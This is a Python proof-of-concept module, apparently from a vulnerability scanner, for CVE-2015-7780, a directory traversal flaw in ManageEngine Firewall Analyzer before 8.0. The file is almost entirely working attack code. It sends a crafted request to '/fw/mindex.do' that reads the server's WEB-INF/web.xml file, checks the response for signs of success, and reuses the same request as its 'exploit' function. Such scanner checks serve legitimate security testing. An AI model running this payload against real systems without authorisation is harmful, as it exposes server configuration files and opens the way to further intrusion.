import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ManageEngine Firewall Analyzer 8.0 - Directory Traversal''',
        "description": '''Directory traversal vulnerability in ManageEngine Firewall Analyzer before 8.0.''',
        "severity": "medium",
        "references": [
            "https://www.exploit-db.com/exploits/35933", 
            "https://www.cvedetails.com/cve/CVE-2015-7780/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "6.5",
            "cve-id": "CVE-2015-7780",
            "cwe-id": "CWE-22"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "lfi", "manageengine"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/fw/mindex.do?url=./WEB-INF/web.xml%3f'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "</web-app>" in resp.text and "java.sun.com" in resp.text and "application/xml" in str(resp.headers):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url